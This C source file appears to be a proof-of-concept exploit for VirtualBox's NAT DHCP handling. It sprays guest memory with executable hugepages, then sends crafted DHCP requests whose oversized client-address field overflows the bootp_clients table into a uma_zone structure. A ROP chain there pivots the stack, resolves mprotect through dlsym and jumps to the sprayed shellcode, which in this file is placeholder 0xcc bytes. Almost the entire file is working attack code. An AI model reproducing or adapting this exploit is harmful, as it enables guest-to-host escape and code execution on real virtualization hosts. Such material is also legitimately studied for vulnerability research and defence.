/* 
 * DHCP code based on project by Samuel Jacob (samueldotj@gmail.com)
 * https://github.com/samueldotj/dhcp-client
 */

#include <err.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "dhcp-client.h"
#include "address.h"

#define MB      	(1024 * 1024UL)

/* from virtualbox */
#define RTCRITSECT_FLAGS_NOP	8
#define NB_ADDR			16

pcap_t *pcap_handle;
char *dev;

/* Predictable address after heap spray */
uint32_t guest_page = 0x84000000;
char dlsym_func[] = "mprotect";

int
set_hugepages(char *pages)
{
	int fd;

	fd = open("/proc/sys/vm/nr_hugepages", O_WRONLY);

	if (fd < 0)
		return -1;
	write(fd, pages, strlen(pages));
	close(fd);

	return 0;
}

void
spray_payload(int npages)
{
	char *shared_mem;
	uint32_t count, pagesize;

	pagesize = getpagesize();
	count = (2 * MB) / pagesize;

	for(int i = 0; i < npages; i++) {
		/* Allocate 2 MB pages */
		shared_mem = mmap(0, 2 * MB, PROT_READ | PROT_WRITE | PROT_EXEC,
				MAP_HUGETLB | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

		/* Set payload for each 4096 bytes */
		for (int page = 0; page < count; page++) {
			/* Copy function name to be resolve using dlsym */
			strcpy(shared_mem, dlsym_func);
			/* Copy shellcode after function name */
			memset(shared_mem + sizeof(dlsym_func), 0xcc, pagesize - sizeof(dlsym_func));
			shared_mem += pagesize;
		}
	}
}

int
get_ip_address(char *dev_name, uint32_t *ip)
{
	struct ifreq s;
	int fd, result;

	memset((void *)&s, 0, sizeof(struct ifreq));
	strcpy(s.ifr_name, dev_name);

	fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	result = ioctl(fd, SIOCGIFADDR, &s);
	close(fd);
	if (result != 0)
		return -1;

	*ip = ((struct sockaddr_in *)&s.ifr_addr)->sin_addr.s_addr;

	return 0;
}

int
fill_dhcp_request_options(dhcp_t *dhcp, uint32_t ip)
{
	int len = 0;
	u_int32_t req_ip = htonl(ip);
	u_int8_t option;

	option = DHCP_OPTION_REQUEST;
	len += fill_dhcp_option(&dhcp->bp_options[len], MESSAGE_TYPE_DHCP, &option, sizeof(option));
	len += fill_dhcp_option(&dhcp->bp_options[len], MESSAGE_TYPE_REQ_IP, (u_int8_t *)&req_ip, sizeof(req_ip));
	option = 0;
	len += fill_dhcp_option(&dhcp->bp_options[len], MESSAGE_TYPE_END, &option, sizeof(option));
	return len;
}

#define DUMMY	0x42424242
#define ADD_ROP(addr, gadget) (*addr = gadget); addr++

void
dhcp_output(dhcp_t *dhcp, u_int8_t *mac, int *len, uint8_t bootp_clients)
{
	uint32_t *rop;

	*len += sizeof(dhcp_t);
	memset(dhcp, 0, sizeof(dhcp_t));

	dhcp->opcode = DHCP_BOOTREQUEST;
	dhcp->htype = DHCP_HARDWARE_TYPE_10_EHTHERNET;
	dhcp->hlen = 6;	

	/* overflow the last client structure */
	if (bootp_clients == NB_ADDR - 1) {

		warnx("[+] Overflowing bootp_clients into uma_zone structure...");
		sleep(2);

		/* start payload after aligning with padding */
		rop = (uint32_t *)((uint8_t *)dhcp->chaddr + 3);

		ADD_ROP(rop, DUMMY);
		ADD_ROP(rop, DUMMY);
		ADD_ROP(rop, DUMMY);
		ADD_ROP(rop, DUMMY);
		ADD_ROP(rop, DUMMY);

		/* Corrupts struct uma_zone beyond this */

		/* Stack pivot returns here. Get address of mprotect using dlsym */
		ADD_ROP(rop, dlsym_plt);
		ADD_ROP(rop, pop_pop_ret);
		ADD_ROP(rop, 0);			// u32Magic not validated
		ADD_ROP(rop, guest_page);
		ADD_ROP(rop, pop_pop_ret);
		ADD_ROP(rop, DUMMY);
		ADD_ROP(rop, RTCRITSECT_FLAGS_NOP);	// skip processing RTCRITSECT	
		ADD_ROP(rop, shift_stack);		// not enough space for mprotect
		ADD_ROP(rop, DUMMY);
		ADD_ROP(rop, DUMMY);
		ADD_ROP(rop, DUMMY);
		/* Stack pivot gadget which gets pushed into stack */
		ADD_ROP(rop, xchg_eax_esp);		// size

		/* Set all pointers to NULL */
		ADD_ROP(rop, 0);			// pfCtor
		ADD_ROP(rop, 0);			// pfDtor
		ADD_ROP(rop, 0);			// pfInit
		ADD_ROP(rop, 0);			// pfFini

		/* Below gadget returns into stack pivot gadget pushed into stack */
		ADD_ROP(rop, mov_eax_ebx);		// pfAlloc

		/* This pointer can't be overwritten with NULL, so just return */
		ADD_ROP(rop, ret);			// pfFree
		ADD_ROP(rop, DUMMY);

		/* dlsym returns with address of mprotect */
		ADD_ROP(rop, jmp_eax);				
		ADD_ROP(rop, guest_page + sizeof(dlsym_func));	// jump to shellcode
		ADD_ROP(rop, guest_page);
		ADD_ROP(rop, 4096);
		ADD_ROP(rop, PROT_READ | PROT_WRITE | PROT_EXEC);

		dhcp->hlen = (uint32_t)rop - (uint32_t)dhcp->chaddr;

	} else {

		memset(dhcp->chaddr, bootp_clients, DHCP_CHADDR_LEN); 
	}

	dhcp->magic_cookie = htonl(DHCP_MAGIC_COOKIE);
}

int
dhcp_request(u_int8_t *mac)
{
	int len, rv;
	u_char packet[4096];
	struct in_addr ip_addr;
	struct udphdr *udp_header;
	struct ip *ip_header;
	dhcp_t *dhcp;
	uint32_t ip;

	ip_header = (struct ip *)(packet + sizeof(struct ether_header));
	udp_header = (struct udphdr *)(((char *)ip_header) + sizeof(struct ip));
	dhcp = (dhcp_t *)(((char *)udp_header) + sizeof(struct udphdr));

	rv = get_ip_address(dev, &ip);
	if (rv != 0)
		errx(EXIT_FAILURE, "[!] Unable to get IP address for %s", dev);

	ip_addr.s_addr = ip;
	warnx("[+] Current IP address : %s", inet_ntoa(ip_addr));

	/* skip the already assigned IP address */
	for (uint8_t bootp_clients = 1; bootp_clients < NB_ADDR; bootp_clients++) {

		ip_addr.s_addr = ntohl(htonl(ip) + bootp_clients);
		warnx("[+] Requesting IP address : %s", inet_ntoa(ip_addr));

		len = fill_dhcp_request_options(dhcp, htonl(ip) + bootp_clients);
		dhcp_output(dhcp, mac, &len, bootp_clients);
		udp_output(udp_header, &len);
		ip_output(ip_header, &len);
		ether_output(packet, mac, len);
	}

	return 0;
}

int main(int argc, char **argv)
{
	int rv;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_int8_t mac[6];

	if (argc < 2)
		errx(EXIT_FAILURE, "[!] Usage: %s <interface>", argv[0]);
	dev = argv[1];

	rv = get_mac_address(dev, mac);
	if (rv != 0)
		errx(EXIT_FAILURE, "[!] Unable to get MAC address for %s", dev);

	pcap_handle = pcap_open_live(dev, BUFSIZ, 0, 10, errbuf);
	if (pcap_handle == NULL)
		errx(EXIT_FAILURE, "[!] Couldn't open device %s", errbuf);

	warnx("[+] Using interface %s...", dev);

	warnx("[+] Spraying the heap with payload...");
	set_hugepages("300");
	spray_payload(200);

	warnx("[+] Sending DHCP requests...");
	dhcp_request(mac);

	pcap_close(pcap_handle);

	return 0;
}
